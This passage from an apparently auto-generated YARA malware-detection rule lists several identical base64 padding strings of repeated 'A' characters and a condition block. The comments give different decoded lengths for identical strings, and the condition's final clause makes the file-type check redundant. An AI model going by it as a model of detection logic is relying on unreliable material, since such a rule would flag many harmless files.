      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                               ' */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                           ' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                   ' */ /* score: '26.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                           ' */ /* score: '26.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                       ' */ /* score: '26.50'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                       ' */ /* score: '26.50'*/
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                               ' */ /* score: '16.50'*/
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                       ' */ /* score: '16.50'*/
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                           ' */ /* score: '16.50'*/
   condition:
      ( ( uint16(0) == 0x6632 or uint16(0) == 0x675a ) and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

